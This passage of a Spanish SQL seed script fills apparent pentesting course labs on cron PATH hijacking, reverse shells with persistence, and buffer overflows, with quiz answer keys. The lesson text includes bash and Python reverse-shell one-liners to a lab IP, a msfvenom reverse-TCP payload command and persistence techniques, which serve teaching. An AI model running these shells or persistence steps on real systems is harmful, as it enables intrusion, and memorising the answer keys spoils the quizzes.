  'cat /etc/crontab muestra todas las tareas del cron del sistema, incluyendo el usuario que las ejecuta y la ruta de los scripts invocados.'
FROM laboratories l WHERE l.slug = 'path-hijacking-cronjobs'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, '/etc/crontab', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, '/var/spool/cron/root', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, '/etc/cron.daily/root', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, '/etc/init.d/cron', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Crear un ejecutable malicioso con el mismo nombre en un directorio prioritario del PATH', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Modificar la variable de entorno del cron directamente', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Eliminar el binario original del sistema', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Inyectar código en el proceso cron directamente', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Minuto, Hora, Día del mes, Mes, Día de la semana', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Segundo, Minuto, Hora, Día, Mes', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Hora, Minuto, Día, Semana, Año', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Día, Mes, Año, Hora, Minuto', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'pspy', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'htop', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'top', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'ps aux', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Inspección del crontab del sistema',
  E'## Objetivo\n\nLee el crontab del sistema para identificar tareas programadas que puedan ser vulnerables.\n\n## Instrucciones\n\n```bash\ncat /etc/crontab\n```\n\n**¿Qué buscar en la salida?**\n\n1. **Scripts con ruta relativa:** si el script se llama sin ruta absoluta (ej: `backup` en vez de `/usr/bin/backup`), es candidato a PATH hijacking.\n\n2. **Scripts con permisos de escritura:** si el script invocado tiene permisos `777` o es escribible por el grupo, puede modificarse.\n\n3. **Directorios con permisos débiles:** si el directorio del script es escribible, se puede reemplazar el script.\n\n**Comandos complementarios:**\n\n```bash\n# Ver todos los archivos cron del sistema\nls -la /etc/cron* /var/spool/cron/\n\n# Monitorear procesos en tiempo real (sin root)\n./pspy64\n```\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'cat /etc/crontab',
  '¡Correcto! Has inspeccionado el crontab del sistema. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'path-hijacking-cronjobs' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- ── Módulo 2: Técnicas de Post-Explotación ────────────────────────────────────

INSERT INTO course_modules (course_id, slug, title, description, position)
SELECT c.id, 'post-explotacion',
  'Técnicas de Post-Explotación',
  'Reverse shells, persistencia en el sistema y fundamentos de buffer overflow para el desarrollo de exploits.',
  2
FROM courses c WHERE c.slug = 'pentesting-avanzado'
ON CONFLICT (course_id, slug) DO UPDATE SET
  title = EXCLUDED.title, description = EXCLUDED.description, position = EXCLUDED.position;

-- ── Lab 7: Reverse Shells y Persistencia ─────────────────────────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'reverse-shell-persistencia',
  'Reverse Shells y Persistencia',
  E'## ¿Qué es una Reverse Shell?\n\nEn una **bind shell** el atacante se conecta al servidor expuesto en la víctima. En una **reverse shell** la dirección se invierte: la víctima se conecta al atacante. Esto es útil cuando la víctima está detrás de un firewall que bloquea conexiones entrantes pero permite salientes.\n\n```\nAtacante (listener)  ←──────────────  Víctima (inicia conexión)\n10.10.10.2:4444                        10.10.10.1\n```\n\n## Netcat — el "navaja suiza" de las redes\n\n```bash\n# Atacante: iniciar listener en puerto 4444\nnc -lvnp 4444\n\n# Víctima: enviar una shell al atacante\nbash -i >& /dev/tcp/10.10.10.2/4444 0>&1\n```\n\n## Reverse shells en otros lenguajes\n\n```python\n# Python\npython3 -c "import socket,subprocess,os;s=socket.socket();s.connect((''10.10.10.2'',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([''/bin/bash''])"  \n```\n\n## Persistencia\n\nTras obtener acceso, el atacante puede establecer persistencia para mantenerlo aunque el sistema se reinicie:\n\n| Método | Descripción |\n|--------|-------------|\n| `~/.bashrc` | Se ejecuta al abrir bash para el usuario |\n| `crontab -e` | Cron job del usuario actual |\n| `/etc/rc.local` | Se ejecuta al iniciar el sistema |\n| SSH authorized_keys | Agregar clave pública del atacante |\n\n## Mejorar la shell\n\nUna raw netcat shell no es interactiva. Para mejorarla:\n\n```bash\npython3 -c "import pty; pty.spawn(''/bin/bash'')"\n```\n\n---\nCompleta el quiz y la actividad para ganar **450 puntos**.',
  1, 50, 450, TRUE
FROM course_modules cm WHERE cm.slug = 'post-explotacion'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab reverse-shell-persistencia

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿Cuál es la diferencia entre una bind shell y una reverse shell?',
  'En una bind shell el servidor escucha en la víctima y el atacante se conecta. En una reverse shell la víctima inicia la conexión hacia el atacante, lo que elude firewalls que bloquean conexiones entrantes.'
FROM laboratories l WHERE l.slug = 'reverse-shell-persistencia'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿Qué flags usa netcat para iniciar un listener interactivo en el puerto 4444?',
  '-l pone netcat en modo escucha, -v activa verbose, -n evita resolución DNS (más rápido), -p especifica el puerto. Juntos: nc -lvnp 4444.'
FROM laboratories l WHERE l.slug = 'reverse-shell-persistencia'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Qué comando Python convierte una raw shell de netcat en una TTY interactiva?',
  'python3 -c "import pty; pty.spawn(''/bin/bash'')" asigna una pseudoterminal, habilitando la edición de línea, historial y comandos interactivos como sudo.'
FROM laboratories l WHERE l.slug = 'reverse-shell-persistencia'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Qué archivo de Linux se usa para persistencia en el arranque del sistema a nivel global?',
  '/etc/rc.local es ejecutado por el sistema al finalizar el arranque con privilegios de root. Es uno de los lugares más comunes para establecer persistencia en sistemas Linux más antiguos.'
FROM laboratories l WHERE l.slug = 'reverse-shell-persistencia'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Inicia un listener de netcat en el puerto 4444 esperando una reverse shell. Copia la respuesta generada.',
  'nc -lvnp 4444 inicia netcat en modo escucha (-l) con verbose (-v), sin resolución DNS (-n) en el puerto (-p) 4444.'
FROM laboratories l WHERE l.slug = 'reverse-shell-persistencia'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'En reverse shell la víctima inicia la conexión hacia el atacante', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Son exactamente lo mismo con diferente nombre', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'En bind shell la víctima se conecta al atacante', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'La reverse shell usa UDP y la bind shell usa TCP', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, '-lvnp', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, '-e /bin/bash', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, '-listen -port', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, '-server -v', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'python3 -c "import pty; pty.spawn(''/bin/bash'')"', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'python3 -c "import shell; shell.tty()"', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'script /dev/null -c bash', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'bash --interactive', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, '/etc/rc.local', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, '~/.bashrc', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, '/tmp/startup.sh', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, '/etc/profile.d/shell.sh', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Listener de reverse shell con netcat',
  E'## Objetivo\n\nConfigura netcat como listener para recibir una reverse shell de la máquina víctima.\n\n## Instrucciones\n\n```bash\nnc -lvnp 4444\n```\n\n**Desglose de los flags:**\n- `-l`: modo escucha (listen)\n- `-v`: verbose — muestra información de conexión\n- `-n`: no resolver DNS (más rápido, evita leaks)\n- `-p 4444`: puerto en el que escuchar\n\n**Una vez que la víctima se conecte, verás:**\n```\nConnection received on 10.10.10.1 [puerto-aleatorio]\nbash-5.1$\n```\n\n**Desde la víctima (Linux), la reverse shell sería:**\n```bash\nbash -i >& /dev/tcp/10.10.10.2/4444 0>&1\n```\n\n**Mejorar la shell obtenida:**\n```bash\npython3 -c "import pty; pty.spawn(''/bin/bash'')"\nexport TERM=xterm\n```\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'nc -lvnp 4444',
  '¡Excelente! Has configurado el listener. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- ── Lab 8: Buffer Overflow — Conceptos Básicos ────────────────────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'buffer-overflow-basico',
  'Buffer Overflow — Conceptos Básicos',
  E'## ¿Qué es un Buffer Overflow?\n\nUn **buffer overflow** (desbordamiento de búfer) ocurre cuando un programa escribe más datos en un búfer de los que puede contener, sobrescribiendo memoria adyacente en el stack. Si se controla qué se escribe en esa memoria, se puede redirigir la ejecución del programa.\n\n## El Stack y el registro EIP/RIP\n\n```\n┌──────────────────┐  ← dirección alta\n│   Parámetros     │\n├──────────────────┤\n│  Dirección ret.  │ ← EIP/RIP: apunta a la siguiente instrucción\n├──────────────────┤\n│   Saved EBP/RBP  │\n├──────────────────┤\n│                  │\n│    BUFFER        │ ← si se desborda, sobrescribe lo de arriba\n│                  │\n└──────────────────┘  ← dirección baja (ESP/RSP)\n```\n\n## Proceso de explotación (32 bits, sin protecciones)\n\n```\n1. Encontrar el offset hasta EIP  →  patrón cíclico + valor de EIP corrompido\n2. Controlar EIP                  →  enviar offset + dirección de retorno deseada\n3. Colocar shellcode              →  en el buffer o en el stack\n4. Apuntar EIP al shellcode       →  dirección en el stack o gadget JMP ESP\n```\n\n## Herramientas esenciales\n\n```bash\n# Generar patrón cíclico de 200 bytes (pwntools)\npython3 -c "from pwn import *; print(cyclic(200))"\n\n# Encontrar el offset con el valor de EIP corrompido\npython3 -c "from pwn import *; print(cyclic_find(0x61616161))"\n\n# Generar shellcode con msfvenom\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.2 LPORT=4444 -f python\n```\n\n## Protecciones modernas\n\n| Protección | Descripción |\n|------------|-------------|\n| **ASLR** | Aleatoriza las direcciones del stack, heap y librerías |\n| **Stack Canary** | Valor centinela entre buffer y EIP; si cambia, aborta |\n| **NX/DEP** | Marca el stack como no ejecutable |\n| **PIE** | El ejecutable mismo se carga en dirección aleatoria |\n\n---\nCompleta el quiz y la actividad para ganar **500 puntos**.',
  2, 60, 500, TRUE
FROM course_modules cm WHERE cm.slug = 'post-explotacion'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab buffer-overflow-basico

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿Qué registro del procesador x86 apunta a la dirección de retorno de una función?',
  'EIP (Extended Instruction Pointer) en 32 bits, RIP en 64 bits, contiene la dirección de la siguiente instrucción a ejecutar. Controlar EIP significa controlar el flujo del programa.'
FROM laboratories l WHERE l.slug = 'buffer-overflow-basico'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿Qué protección del sistema operativo hace aleatorias las direcciones del stack en cada ejecución?',
  'ASLR (Address Space Layout Randomization) randomiza las direcciones de carga del stack, heap y librerías compartidas, dificultando los exploits que dependen de saltar a direcciones fijas.'
FROM laboratories l WHERE l.slug = 'buffer-overflow-basico'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Para qué se usa un patrón cíclico (cyclic pattern) en el desarrollo de un exploit de buffer overflow?',
  'Un patrón cíclico es una cadena donde cada subsecuencia de N bytes es única. Cuando sobrescribe EIP, el valor en EIP identifica exactamente el offset desde el inicio del buffer hasta la dirección de retorno.'
FROM laboratories l WHERE l.slug = 'buffer-overflow-basico'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Qué hace un Stack Canary como medida de protección contra buffer overflows?',
  'El stack canary es un valor aleatorio colocado entre el buffer y la dirección de retorno. Antes de retornar, la función verifica que el canary no cambió. Si fue sobrescrito por un overflow, el programa aborta.'
FROM laboratories l WHERE l.slug = 'buffer-overflow-basico'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Genera un patrón cíclico de 200 bytes con pwntools para determinar el offset hasta EIP. Copia la respuesta generada.',
  'cyclic(200) de pwntools genera 200 bytes con patrón único en cada posición. Al enviar esto como input y ver el valor de EIP en el crash, cyclic_find() calcula el offset exacto.'
FROM laboratories l WHERE l.slug = 'buffer-overflow-basico'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'EIP (Extended Instruction Pointer)', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'ESP (Extended Stack Pointer)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'EBP (Extended Base Pointer)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'EAX (Accumulator Register)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'ASLR (Address Space Layout Randomization)', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Stack Canary', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'NX/DEP', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'PIE (Position Independent Executable)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Determinar el offset exacto desde el inicio del buffer hasta EIP', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Generar shellcode listo para ejecutar', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Detectar qué protecciones tiene el binario', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Desactivar ASLR en el sistema objetivo', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Un valor centinela entre el buffer y EIP que detecta sobrescrituras', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Cifra el contenido del stack en tiempo de ejecución', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Marca el stack como de solo lectura', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Limita el tamaño máximo del stack del proceso', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Patrón cíclico con pwntools',
  E'## Objetivo\n\nGenera un patrón cíclico de 200 bytes usando pwntools, el primer paso para encontrar el offset hasta EIP en un exploit de buffer overflow.\n\n## Instrucciones\n\n```bash\npython3 -c "from pwn import *; print(cyclic(200))"\n```\n\n**¿Cómo funciona el patrón cíclico?**\n\nCada secuencia de 4 bytes dentro del patrón es única. Cuando el programa crashea con el patrón como input:\n\n1. Revisas el valor de EIP en el debugger (ej: `0x61616163`)\n2. Ejecutas `cyclic_find()` para calcular el offset:\n\n```bash\npython3 -c "from pwn import *; print(cyclic_find(0x61616163))"\n# Output: 8 (el offset es 8 bytes)\n```\n\n3. Confirmas el control de EIP:\n\n```python\nfrom pwn import *\npayload = b"A" * 8        # offset\npayload += p32(0xdeadbeef) # nuevo valor de EIP\n```\n\n**Instalar pwntools:**\n\n```bash\npip3 install pwntools\n```\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'python3 -c "from pwn import *; print(cyclic(200))"',
  '¡Excelente! Has generado el patrón cíclico con pwntools. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'buffer-overflow-basico' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- =============================================================================
-- FIN DEL SEED
-- Resumen de contenido insertado:
--   Cursos:       2 nuevos (intermedio + avanzado)
--   Módulos:      4 nuevos
--   Laboratorios: 8 nuevos (150 a 500 puntos)
--   Preguntas:    40 nuevas (32 opción múltiple + 8 actividad)
--   Actividades:  8 nuevas
--   Puntos totales disponibles: 2650
